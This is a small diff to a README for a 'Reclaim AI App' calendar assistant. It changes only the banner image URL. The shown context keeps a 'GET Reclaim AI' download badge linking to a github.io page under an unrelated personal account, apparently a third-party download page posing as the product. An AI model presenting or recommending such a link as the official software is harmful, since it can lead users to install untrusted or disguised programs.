@@ -1,6 +1,6 @@
 # Reclaim AI App - Smart Calendar Automation and Scheduling Assistant
 
-![Banner Placeholder](https://mms.businesswire.com/media/20240423373583/en/2106111/22/reclaim_lockup.jpg)
+![Banner Placeholder](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTObCl1N8knj4ilOGrnmO_Ws6Fnc4Py5Tm5lQ&s)
 
 [![GET Reclaim AI](https://img.shields.io/badge/GET%20%E2%80%94%20Reclaim%20AI-0078D6?style=for-the-badge&logoColor=white)](https://dorianrussopoml.github.io/.github/reclaim-ai)
 
